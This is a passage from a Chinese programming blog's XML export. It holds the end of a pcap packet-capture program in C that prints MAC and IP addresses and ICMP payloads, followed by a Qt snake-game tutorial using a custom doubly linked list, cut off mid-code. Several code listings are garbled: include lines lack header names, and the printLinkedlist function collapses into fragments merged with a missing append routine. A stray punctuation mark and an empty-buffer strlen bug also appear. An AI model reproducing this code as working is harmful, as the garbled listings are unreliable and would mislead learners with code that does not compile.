<span class="comment">//开始处理函数</span></span><br><span class="line">              pcap_loop(adHande, <span class="number">0</span>, packet_handler, <span class="literal">NULL</span>);</span><br><span class="line">             </span><br><span class="line">              pcap_freealldevs(alldevs);</span><br><span class="line"> </span><br><span class="line">              <span class="comment">//释放一个过滤器</span></span><br><span class="line">              pcap_freecode(&amp;bpf_pro);。</span><br><span class="line"> </span><br><span class="line">              pcap_close(adHande);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//开始处理获取的数据包</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">packet_handler</span><span class="params">(u_char *param, <span class="keyword">const</span> struct pcap_pkthdr *header, <span class="keyword">const</span> u_char *pkt_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//打印MAC地址</span></span><br><span class="line">       <span class="keyword">int</span> j;</span><br><span class="line">       EthernetHeader *ethernet = (EthernetHeader*)pkt_data;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Source MAC:"</span>);</span><br><span class="line">       <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (j==<span class="number">5</span>)</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"%2x"</span>, ethernet-&gt;bySrcMac[j]);</span><br><span class="line">              <span class="keyword">else</span>      </span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"%2x:"</span>, ethernet-&gt;bySrcMac[j]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"\t"</span>);</span><br><span class="line"> </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Dest MAC:"</span>);</span><br><span class="line">       <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">6</span>;j++)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (j == <span class="number">5</span>)</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"%2x"</span>, ethernet-&gt;byDestMac[j]);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"%2x:"</span>, ethernet-&gt;byDestMac[j]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">       <span class="comment">// 从 IP层开始读取数据！！偏移 14字节</span></span><br><span class="line">       <span class="comment">//14为以太网帧头部长度</span></span><br><span class="line">      </span><br><span class="line">       <span class="comment">//获取原始的IP层协议</span></span><br><span class="line">       IPHeader2* iphdr = (IPHeader2*)(pkt_data + <span class="keyword">sizeof</span>(EthernetHeader));</span><br><span class="line">       IPHeader* iphdr0 = (IPHeader*)(pkt_data + <span class="keyword">sizeof</span>(EthernetHeader));</span><br><span class="line">      </span><br><span class="line"> </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%d.%d.%d.%d\t%d.%d.%d.%d\n"</span>,</span><br><span class="line">              iphdr-&gt;m_ulSrcIP.byte1, iphdr-&gt;m_ulSrcIP.byte2,</span><br><span class="line">              iphdr-&gt;m_ulSrcIP.byte3, iphdr-&gt;m_ulSrcIP.byte4,</span><br><span class="line">              iphdr-&gt;m_ulDestIP.byte1, iphdr-&gt;m_ulDestIP.byte2,</span><br><span class="line">              iphdr-&gt;m_ulDestIP.byte3, iphdr-&gt;m_ulDestIP.byte4</span><br><span class="line">       );</span><br><span class="line">      </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%d.%05d\tlen:%d\n"</span>,header-&gt;ts.tv_sec, header-&gt;ts.tv_usec, header-&gt;len);</span><br><span class="line"> </span><br><span class="line">       <span class="comment">//icmp</span></span><br><span class="line">       <span class="keyword">if</span> (iphdr-&gt;m_byProtocol==IPPROTO_ICMP)</span><br><span class="line">       &#123;</span><br><span class="line">              ICMPHeader*icmphdr = (ICMPHeader*)(pkt_data + <span class="number">14</span> + <span class="keyword">sizeof</span>(IPHeader));</span><br><span class="line"> </span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Type:%d\t%d\n"</span>, icmphdr-&gt;m_byType, icmphdr-&gt;m_ulTimeStamp);</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">char</span> data[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">              <span class="built_in">memcpy</span>(data, ((<span class="keyword">char</span>*)icmphdr) + <span class="keyword">sizeof</span>(ICMPHeader), <span class="number">50</span>);</span><br><span class="line">              data[<span class="built_in">strlen</span>(data) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Data:%s\n"</span>, data);</span><br><span class="line"> </span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt实现贪吃蛇2:链表实现</title>
    <url>/cpp-snake2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面已经介绍了用数组实现贪吃蛇，有了前面的基础知识，所以我就开门见山了。</p>
<a id="more"></a>



<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>此文是在前面的数组实现基础上加以改进的，所以说大部分还是很相似的。不过链表还是和数组有一定的区别的，所以在看此文之前，要有一些关于c链表的的知识…而且对于新手来讲还是有一定难度的。。。那么开始吧</p>
<ul>
<li>首先，我先创建一个链表类（为什么我不能Qt自带的 <code>QLinkedList</code> ，因为用不习惯：(</li>
</ul>
<p><strong>linkedlist.h</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LINKEDLIST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LINKEDLIST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Linkedlist</span>:</span>QObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//蛇节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SnakeNode</span>&#123;</span></span><br><span class="line">        QPoint pos;</span><br><span class="line">        SnakeNode* next;</span><br><span class="line">        SnakeNode* prev;</span><br><span class="line">    &#125;;</span><br><span class="line">    Linkedlist(QObject *parent=<span class="number">0</span>,QPoint headPos=QPoint()):</span><br><span class="line">        QObject(parent),m_length(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//初始化链表头，即蛇头</span></span><br><span class="line">            m_head=<span class="keyword">new</span> SnakeNode;</span><br><span class="line">            m_head-&gt;pos=headPos;</span><br><span class="line">            m_head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">            m_head-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~Linkedlist()&#123;</span><br><span class="line">            clearAllNodes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回头节点</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> SnakeNode *<span class="title">first</span><span class="params">()</span><span class="keyword">const</span></span>&#123;<span class="keyword">if</span>(m_head)&#123;<span class="keyword">return</span> m_head;&#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="comment">//返回尾节点</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> SnakeNode *<span class="title">last</span><span class="params">()</span><span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_head)&#123;</span><br><span class="line">            SnakeNode *p1=m_head;</span><br><span class="line">            SnakeNode *p2;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                p2=p1;</span><br><span class="line">                p1=p1-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (p1);</span><br><span class="line">            <span class="keyword">return</span> p2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回节点总数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">getLength</span><span class="params">()</span></span>&#123;</span><br><span class="line">         m_length=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">if</span>(m_head)&#123;</span><br><span class="line">             SnakeNode *p=m_head;</span><br><span class="line">             <span class="keyword">do</span> &#123;</span><br><span class="line">                 m_length+=<span class="number">1</span>;</span><br><span class="line">                 p=p-&gt;next;</span><br><span class="line">             &#125; <span class="keyword">while</span> (p!=<span class="literal">NULL</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> m_length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印所以节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printLinkedlist</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_head )&#123;</span><br><span class="line">            SnakeNode *p=m_head;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                qDebug()&lt;pos;</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (p);</span><br><span class="line">            qDebug()&lt;last())&#123;</span><br><span class="line">          SnakeNode *ls=<span class="keyword">this</span>-&gt;last();</span><br><span class="line">          <span class="keyword">if</span>(ls)&#123;</span><br><span class="line">              SnakeNode *p2=<span class="keyword">new</span> SnakeNode;</span><br><span class="line">              p2-&gt;prev=ls;</span><br><span class="line">              p2-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">              p2-&gt;pos=pos;</span><br><span class="line"></span><br><span class="line">              ls-&gt;next=p2;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放所有节点</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">clearAllNodes</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_head)&#123;</span><br><span class="line">            SnakeNode *p=m_head;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                SnakeNode*t=p;</span><br><span class="line">                m_head=p-&gt;next;</span><br><span class="line">                <span class="keyword">delete</span> t;</span><br><span class="line">                t=<span class="literal">NULL</span>;</span><br><span class="line">                p=m_head;</span><br><span class="line">            &#125; <span class="keyword">while</span> (p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_length;</span><br><span class="line">    SnakeNode *m_head;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// LINKEDLIST_H</span></span></span><br></pre></td></tr></table></figure>

<p>这里就不多说了。。。不过要注意这里的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//蛇节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SnakeNode</span>&#123;</span></span><br><span class="line">    QPoint pos;</span><br><span class="line">    SnakeNode* next;</span><br><span class="line">    SnakeNode* prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>原本是没有 <code>SnakeNode* prev;</code> 的，后来在写代码时遇到点棘手的问题，所以就该了一下，变成双向链表。不过这里没有太在意这些，而且关于链表的操作也很少</p>
<p><strong>widget.h</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WIDGET_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIDGET_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QLinkedList&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QTimer&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QKeyEvent&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"linkedlist.h"</span></span></span><br><span class="line"><span class="keyword">namespace</span> Ui &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QLineEdit</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> :</span> <span class="keyword">public</span> QWidget</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">keyPressEvent</span><span class="params">(QKeyEvent *event)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">paintEvent</span><span class="params">(QPaintEvent *event)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//蛇头移动方向</span></span><br><span class="line">    <span class="keyword">enum</span> SnakeDirection:<span class="keyword">int</span>&#123;</span><br><span class="line">        Up,</span><br><span class="line">        Down,</span><br><span class="line">        Left,</span><br><span class="line">        Right</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Widget</span><span class="params">(QWidget *parent = <span class="number">0</span>)</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">initializedGUI</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">resetFoodPos</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkisEatSelf</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkisEatFood</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkisHitWall</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkFoodPosisEqualHeadPos</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">snakeRunning</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeOut</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startGame</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">stopGame</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Linkedlist *linkedlist;  <span class="comment">//蛇链表</span></span><br><span class="line">    <span class="keyword">int</span> m_eatfoodCount; <span class="comment">//吃到食物总数</span></span><br><span class="line">    QPoint m_foodPos;<span class="comment">//食物坐标</span></span><br><span class="line">    <span class="keyword">int</span> m_direction;<span class="comment">//蛇头方向</span></span><br><span class="line">    <span class="keyword">int</span> m_speed;<span class="comment">//蛇移动速度</span></span><br><span class="line">    <span class="keyword">int</span> m_score ;<span class="comment">//得分</span></span><br><span class="line">    QPoint m_tmpPosPrev;</span><br><span class="line">    QTimer *m_timerControl;</span><br><span class="line">    QLineEdit *leScore;</span><br><span class="line">    Ui::Widget *ui;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// WIDGET_H</span></span></span><br></pre></td></tr></table></figure>

<p><strong>widget.cpp</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"widget.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ui_widget.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QVBoxLayout&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QLabel&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QLineEdit&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPainter&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QTime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROW 20 <span class="comment">//行数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COLUMN 20 <span class="comment">//列数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Direction 4 <span class="comment">//方向(枚举值</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::keyPressEvent</span><span class="params">(QKeyEvent *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(event-&gt;key()==<span class="string">'W'</span>&amp;&amp;m_direction!=Down)&#123;</span><br><span class="line">        m_direction=Up;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(event-&gt;key()==<span class="string">'S'</span>&amp;&amp;m_direction!=Up)&#123;</span><br><span class="line">        m_direction=Down;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(event-&gt;key()==<span class="string">'A'</span>&amp;&amp;m_direction!=Right)&#123;</span><br><span class="line">        m_direction=Left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(event-&gt;key()==<span class="string">'D'</span>&amp;&amp;m_direction!=Left)&#123;</span><br><span class="line">        m_direction=Right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::paintEvent</span><span class="params">(QPaintEvent *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q_UNUSED(event);</span><br><span class="line">    QPen pen;</span><br><span class="line">    pen.setColor(QColor(Qt::darkGray));</span><br><span class="line">    QFont font;</span><br><span class="line">    font.setPointSize(<span class="number">6</span>);</span><br><span class="line">    <span class="function">QPainter <span class="title">p</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    p.drawPixmap(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">width</span>(),<span class="built_in">height</span>(),QPixmap(<span class="string">":/img/imgs/bg.jpg"</span>));</span><br><span class="line">    p.setPen(pen);</span><br><span class="line">    p.setFont(font);</span><br><span class="line">    <span class="comment">//绘制游戏布局</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; ROW; ++row) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> column =<span class="number">0</span>; column &lt; COLUMN; ++column) &#123;</span><br><span class="line">            p.fillRect(row*<span class="number">20</span>,column*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>,QBrush(QColor(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>)));</span><br><span class="line">            p.drawRect(row*<span class="number">20</span>,column*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//绘制食物</span></span><br><span class="line">    p.fillRect(m_foodPos.x()*<span class="number">20</span>,m_foodPos.y()*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>,</span><br><span class="line">               QBrush(QPixmap(<span class="string">":/img/imgs/apple.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>)));</span><br><span class="line">    <span class="comment">//绘制蛇</span></span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first())&#123;</span><br><span class="line">       Linkedlist:: SnakeNode *pt=linkedlist-&gt;first();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(linkedlist-&gt;first()==pt)&#123;<span class="comment">//绘制蛇头</span></span><br><span class="line">               QPixmap pixmap;</span><br><span class="line">               <span class="keyword">switch</span> (m_direction) &#123;</span><br><span class="line">               <span class="keyword">case</span> Up:</span><br><span class="line">                   pixmap=QPixmap(<span class="string">":/img/imgs/up.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">case</span> Down:</span><br><span class="line">                   pixmap=QPixmap(<span class="string">":/img/imgs/down.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">case</span> Left:</span><br><span class="line">                   pixmap=QPixmap(<span class="string">":/img/imgs/left.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">case</span> Right:</span><br><span class="line">                   pixmap=QPixmap(<span class="string">":/img/imgs/right.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">default</span>:</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               p.fillRect(pt-&gt;pos.x()*<span class="number">20</span>,</span><br><span class="line">                          pt-&gt;pos.y()*<span class="number">20</span>,</span><br><span class="line">                          <span class="number">20</span>,<span class="number">20</span>,</span><br><span class="line">                          QBrush(pixmap));</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(linkedlist-&gt;last()==pt)&#123; <span class="comment">//绘制蛇尾</span></span><br><span class="line">               QPixmap pixmap;</span><br><span class="line">               pixmap=QPixmap(<span class="string">":/img/imgs/tail.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">               p.fillRect(pt-&gt;pos.x()*<span class="number">20</span>,</span><br><span class="line">                          pt-&gt;pos.y()*<span class="number">20</span>,</span><br><span class="line">                          <span class="number">20</span>,<span class="number">20</span>,</span><br><span class="line">                          QBrush(pixmap));</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;<span class="comment">//绘制蛇的其他位置</span></span><br><span class="line">               QPixmap pixmap;</span><br><span class="line">               pixmap=QPixmap(<span class="string">":/img/imgs/body.png"</span>).scaled(<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">               p.fillRect(pt-&gt;pos.x()*<span class="number">20</span>,</span><br><span class="line">                          pt-&gt;pos.y()*<span class="number">20</span>,</span><br><span class="line">                          <span class="number">20</span>,<span class="number">20</span>,</span><br><span class="line">                          QBrush(pixmap));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//指向下一个蛇身节点</span></span><br><span class="line">            pt=pt-&gt;next;</span><br><span class="line">        &#125;<span class="keyword">while</span>(pt!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Widget::Widget(QWidget *parent) :</span><br><span class="line">    QWidget(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;setFixedSize(<span class="number">800</span>,<span class="number">450</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;setWindowTitle(<span class="string">"贪吃蛇"</span>);</span><br><span class="line">    initializedGUI();</span><br><span class="line">&#125;</span><br><span class="line">Widget::~Widget()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::initializedGUI</span></span><br><span class="line"><span class="comment">/// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::initializedGUI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_score=<span class="number">0</span>;</span><br><span class="line">    QPushButton *btnStart=<span class="keyword">new</span> QPushButton(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton *btnStop=<span class="keyword">new</span> QPushButton(<span class="keyword">this</span>);</span><br><span class="line">    QLabel *lbScore=<span class="keyword">new</span> QLabel(<span class="keyword">this</span>);</span><br><span class="line">    leScore=<span class="keyword">new</span> QLineEdit(<span class="keyword">this</span>);</span><br><span class="line">    btnStart-&gt;setText(QObject::tr(<span class="string">"开始游戏"</span>));</span><br><span class="line">    btnStop-&gt;setText(QObject::tr(<span class="string">"暂停游戏"</span>));</span><br><span class="line">    btnStart-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">    btnStop-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">    lbScore-&gt;setText(tr(<span class="string">"得分:"</span>));</span><br><span class="line">    leScore-&gt;setText(QString::number(m_score));</span><br><span class="line">    leScore-&gt;setFocusPolicy(Qt::NoFocus);</span><br><span class="line">    leScore-&gt;setEnabled(<span class="literal">false</span>);</span><br><span class="line">    lbScore-&gt;<span class="built_in">move</span>(<span class="number">500</span>,<span class="number">50</span>);</span><br><span class="line">    leScore-&gt;<span class="built_in">move</span>(<span class="number">560</span>,<span class="number">50</span>);</span><br><span class="line">    btnStart-&gt;<span class="built_in">move</span>(<span class="number">500</span>,<span class="number">100</span>);</span><br><span class="line">    btnStop-&gt;<span class="built_in">move</span>(<span class="number">500</span>,<span class="number">150</span>);</span><br><span class="line">    <span class="built_in">connect</span>(btnStart,SIGNAL(clicked(<span class="keyword">bool</span>)),<span class="keyword">this</span>,SLOT(startGame()));</span><br><span class="line">    <span class="built_in">connect</span>(btnStop,SIGNAL(clicked(<span class="keyword">bool</span>)),<span class="keyword">this</span>,SLOT(stopGame()));</span><br><span class="line">    QTime t= QTime::currentTime();</span><br><span class="line">    <span class="keyword">int</span> s= t.secsTo(QTime(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">    qsrand(s);<span class="comment">//随机数</span></span><br><span class="line">    m_direction=qrand()%Direction;</span><br><span class="line">    <span class="keyword">switch</span> (m_direction) &#123;</span><br><span class="line">    <span class="keyword">case</span> Up:qDebug()&lt;&lt;<span class="string">"蛇头方向:上"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Down:qDebug()&lt;&lt;<span class="string">"蛇头方向:下"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Left:qDebug()&lt;&lt;<span class="string">"蛇头方向:左"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Right:qDebug()&lt;&lt;<span class="string">"蛇头方向:右"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m_foodPos.setX(qrand()%COLUMN);</span><br><span class="line">    m_foodPos.setY(qrand()%ROW);</span><br><span class="line">    qDebug()&lt;&lt;<span class="string">"食物坐标:"</span>&lt;&lt;m_foodPos;</span><br><span class="line">    m_speed=<span class="number">150</span>;</span><br><span class="line">    m_timerControl=<span class="keyword">new</span> QTimer(<span class="keyword">this</span>);</span><br><span class="line">    m_timerControl-&gt;setInterval(m_speed);</span><br><span class="line">    <span class="built_in">connect</span>(m_timerControl,SIGNAL(timeout()),<span class="keyword">this</span>,SLOT(timeOut()));</span><br><span class="line">    QPoint pos;</span><br><span class="line">    pos.setX(qrand()%COLUMN);</span><br><span class="line">    pos.setY(qrand()%ROW);</span><br><span class="line">    <span class="comment">//在Linkedlist构造时初始化蛇头坐标</span></span><br><span class="line">    linkedlist=<span class="keyword">new</span> Linkedlist(<span class="keyword">this</span>,pos);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::resetFoodPos</span></span><br><span class="line"><span class="comment">/// 重设食物坐标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::resetFoodPos</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_foodPos.setX(qrand()%COLUMN);</span><br><span class="line">    m_foodPos.setY(qrand()%ROW);</span><br><span class="line">    checkFoodPosisEqualHeadPos();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::checkisEatSelf</span></span><br><span class="line"><span class="comment">/// 判断是否吃到自己</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 